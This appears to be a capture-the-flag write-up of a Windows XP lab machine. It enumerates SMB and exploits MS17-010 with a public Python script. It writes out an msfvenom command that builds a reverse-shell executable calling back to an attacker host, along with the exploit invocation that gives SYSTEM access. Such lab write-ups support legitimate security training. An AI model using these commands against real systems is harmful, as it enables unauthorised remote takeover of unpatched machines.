## Methodology
1. Port Enumeration
2. Samba version enumeration
3. Manual exploit
4. SYSTEM access to target

## Port Enumeration
The nmap port scan had identified 2 open ports- netbios-ssn (139) and microsoft-ds (445), running SMB services.
The vulnerability script scan had identified the vulnerabilities **MS08-067** and **MS17-010** from the Microsoft 
Security Bulletin.

## Manual Exploit
The exploits from exploit-db for **MS17-010** did not work as expected. With the intention of avoiding metasploit module, 
after googling for a while a working
 manual exploit named [send_and_execute.py](https://github.com/helviojunior/MS17-010) was found. 
 > Note: The exploit requires **Impacket** and **mysmb.py** in order to work.

## SYSTEM access
As per the source code, the exploit takes two mandatory arguments, *target IP* and the *executable* that gets executed on the
target as *SYSTEM* user. A windows reverse shell as an executable was generated with *msfvenom* as follows.
``` 
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.16 LPORT=9090 EXITFUNC=thread -f exe -a x86 --platform windows -o legacy.exe
No encoder or badchars specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes
Saved as: legacy.exe
```
Post generating the reverse shell, a netcat listener on port 9090 was started on the attacking machine. The exploit was 
executed as ```python2.7 send_and_execute.py 10.10.10.4 legacy.exe```
After successful execution of the exploit, a reverse shell was captured on the netcat listener.

> Being an old Windows XP OS, the target did not have *whoami* binary installed. One method of finding out the current 
user is to upload a *32-bit whoami executable* to the target and use it. However the easiest way to check if we have
*Administrator* access, is by checking if **root.txt** from *C:\Documents and Settings\Administrator\Desktop* is readable.
